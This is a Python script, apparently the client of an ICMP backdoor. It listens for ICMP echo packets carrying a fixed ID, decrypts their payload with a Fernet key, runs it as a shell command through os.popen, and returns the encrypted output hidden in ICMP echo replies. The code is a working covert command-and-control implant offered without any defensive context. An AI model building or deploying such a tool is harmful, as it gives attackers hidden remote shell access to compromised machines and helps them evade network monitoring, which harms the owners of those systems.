from scapy.all import sr, IP, ICMP, Raw, sniff
from cryptography.fernet import Fernet
from threading import Thread
import base64
import os

# Config
ICMP_ID = 13170
TTL = 64
DST_IP = '127.0.0.1'
INT = 'lo'  # Change to your active interface

# Load encryption key
def load_key():
    with open('key', 'rb') as keyfile:
        return Fernet(keyfile.read())

key = load_key()

# Encryption
def encrypt_data(data, fernet):
    return base64.b64encode(fernet.encrypt(data.encode())).decode()

def decrypt_data(data, fernet):
    return fernet.decrypt(base64.b64decode(data)).decode()

# Handle incoming ICMP
def icmp_recv(pkt):
    if pkt.haslayer(Raw) and pkt[IP].src == DST_IP and pkt[ICMP].type == 8 and pkt[ICMP].id == ICMP_ID:
        try:
            command = decrypt_data(pkt[Raw].load.decode('utf-8', errors='ignore'), key)
            print(f"[+] Command received: {command}")

            output = os.popen(command).read()
            if not output:
                output = "[No output]"

            # Truncate output to avoid ICMP packet issues
            output = output[:1024]

            encrypted_output = encrypt_data(output, key)
            response = IP(dst=DST_IP, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=encrypted_output)
            sr(response, timeout=0, verbose=0)

        except Exception as e:
            print(f"[!] Error handling packet: {e}")

print("[+] ICMP Listener Started!")
sniff(iface=INT, prn=icmp_recv, filter='icmp', store=0)
